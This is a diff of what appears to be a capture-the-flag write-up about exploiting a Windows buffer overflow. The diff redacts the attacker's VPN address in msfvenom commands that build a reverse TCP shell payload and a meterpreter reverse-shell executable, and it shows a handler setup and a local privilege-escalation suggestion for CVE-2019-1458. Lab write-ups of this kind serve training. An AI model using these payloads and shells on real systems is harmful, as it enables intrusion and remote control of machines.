@@ -238,7 +238,7 @@ except:
 
 - now we can update the exploit with new msfvenom output with openvpn ip and run it against our target
 
-- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=7777 -b "\x00\x0a" -f c`` 
+- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=7777 -b "\x00\x0a" -f c`` 
 
 ```python
 import socket
@@ -310,7 +310,7 @@ System Type:               x64-based PC
 ### [](###header-3)Meterpreter Shell
 
 - ``msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp``
-- ``msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.2.127.225 LPORT=8888 -f exe -o reverse.exe``
+- ``msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.x.x.x LPORT=8888 -f exe -o reverse.exe``
 - ``msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester``
 - ``[+] 10.10.136.143 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.``
 
